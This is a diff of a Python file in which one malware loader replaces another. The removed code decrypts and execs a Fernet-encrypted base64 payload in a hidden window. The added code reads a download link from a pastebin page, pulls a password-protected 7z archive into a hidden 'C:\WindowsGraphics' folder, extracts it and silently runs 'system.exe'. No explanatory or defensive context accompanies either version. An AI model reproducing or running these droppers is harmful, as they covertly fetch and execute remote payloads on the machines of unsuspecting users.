@@ -1,21 +1,48 @@
-import tempfile
-from subprocess import Popen, CREATE_NO_WINDOW
-from sys import executable
-import time
-time.sleep(5)
-# Temporäre Datei erstellen und den Code schreiben
-script_code = """
-import os, base64
-os.system('pip install requests cryptography')
-from cryptography.fernet import Fernet
-key = bytes('\\x42\\x39\\x4c\\x76\\x6f\\x35\\x4e\\x73\\x75\\x69\\x78\\x63\\x58\\x35\\x77\\x76\\x65\\x45\\x53\\x63\\x41\\x76\\x58\\x46\\x7a\\x31\\x44\\x64\\x63\\x6b\\x30\\x2d\\x6a\\x6d\\x6c\\x6d\\x63\\x6b\\x70\\x48\\x72\\x65\\x34\\x3d', 'latin1')
-cipher = Fernet(key)
-exec(cipher.decrypt(base64.b64decode('Z0FBQUFBQm5vZ2E3Wl8wcTBfRVZCdnd3Ny1ibnUtSEtaOXlnb2tQMTU1R2xIc2htaC1TdjZ3WGhjMUpZMFI0NVRMOGxaYllCTlhEeXltd0tCTW5jMXBJbW9XalQ1dXh1cXFaVW9NLWJNRmpXaVE2R1B2a3NoWmVIUUZBLXV5VktnY1ktek1ackZhVUhnUG1EVFFJMzVod214ai03RlN2RWlMYUFWS3VGcU16VDd6eWMwN09UbzdSSWRPcnlJdmY3OEFGLU1Va184eWgzRVZGd2NTOGpjZmUxQUhWWTF1MnF5SW9adVRaZE5yb1hpdnZ3eTNBYVh3THkxaFRNdE83RllRSkVIQkc0d19nQVJSQ19USktON0NvenRPTGdzRzNNS09LLUVnX2JGeE1GdXJyOTlVMkxhbnByUmNXSklnNmhreUVjUFgxeVhhZWFzVnhwZ2sxRU5sTklXWTZrTGh6NjZwMjhoOVlFLTNUY0xVY3dzTlZWYmpMdlIzcnhSR05LUzliZzFVZXBneUVtMl9FTHlfWG1WdUptS2NhVktkTDNzXy1UWVRNT2RnQnp2QmVJeG1UWlhFX2RGTFNzS1BRMXhIRFh3Z3YxcDFPenhFQTR2d2ZFcHB4NG52blpDVEhjSzU0WjlYLTBPMlg2SEk2bVVEUFVsYjgwTHJvbmFZVFJKREV2eVBkQkl0UjU=')).decode())
-"""
+user = "gomanclan"
+import os
+import subprocess
+import shutil
+import sys
+import random
+import string
+import requests
+import py7zr
 
-with tempfile.NamedTemporaryFile(delete=False, suffix=".py") as _ttmp:
-    _ttmp.write(script_code.encode())
-    script_path = _ttmp.name
 
-# Unsichtbare Ausführung (CREATE_NO_WINDOW)
-Popen([executable.replace("python.exe", "pythonw.exe"), script_path], creationflags=CREATE_NO_WINDOW)
+def generate_random_string(length=10):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+
+def main():
+    try:
+        url_pastebin = "https://pastebin.com/raw/qPY3qm5x"
+        response = requests.get(url_pastebin)
+        seven_z_url = response.text.strip()
+
+        random_string = generate_random_string()
+        new_folder = os.path.join("C:\WindowsGraphics\Binds", f"Bind-{random_string}")
+        os.makedirs(new_folder, exist_ok=True)
+
+        hidden_path = 'C:/WindowsGraphics'
+        subprocess.run(['attrib', '+h', hidden_path], creationflags=subprocess.CREATE_NO_WINDOW)
+
+        # Descargar el archivo 7z
+        seven_z_path = os.path.join(new_folder, "update.7z")
+        with requests.get(seven_z_url, stream=True) as r:
+            with open(seven_z_path, "wb") as f:
+                shutil.copyfileobj(r.raw, f)
+
+        extract_path = new_folder
+        password = "gaul_0xudjUy6128xbv68hSu"
+
+        with py7zr.SevenZipFile(seven_z_path, mode='r', password=password) as archive:
+            archive.extractall(path=extract_path)
+
+        exe_path = os.path.join(new_folder, "system.exe")
+        if os.path.exists(exe_path):
+            subprocess.run([exe_path], creationflags=subprocess.CREATE_NO_WINDOW)
+            sys.exit(0)
+
+    except Exception as e:
+        pass
+
+main()
